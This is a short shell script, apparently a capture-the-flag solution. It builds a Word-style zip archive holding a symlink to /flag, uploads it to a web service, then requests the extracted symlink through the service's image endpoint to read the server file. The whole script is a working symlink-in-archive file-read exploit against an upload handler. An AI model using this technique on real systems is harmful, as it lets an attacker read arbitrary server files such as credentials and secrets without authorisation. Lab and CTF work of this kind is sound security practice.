HOST=${HOST:-localhost}
PORT=${PORT:-12000}

mkdir -p word/media
ln -s /flag word/media/flag.txt
zip -qry payload.zip word
URL=$(curl -L "http://${HOST}:${PORT}/upload" -F "file=@payload.zip" -o /dev/null -w %{url_effective} 2>/dev/null)
PARAM=${URL##*/}
curl "http://${HOST}:${PORT}/image/${PARAM}/flag.txt"
rm -rf word/ payload.zip
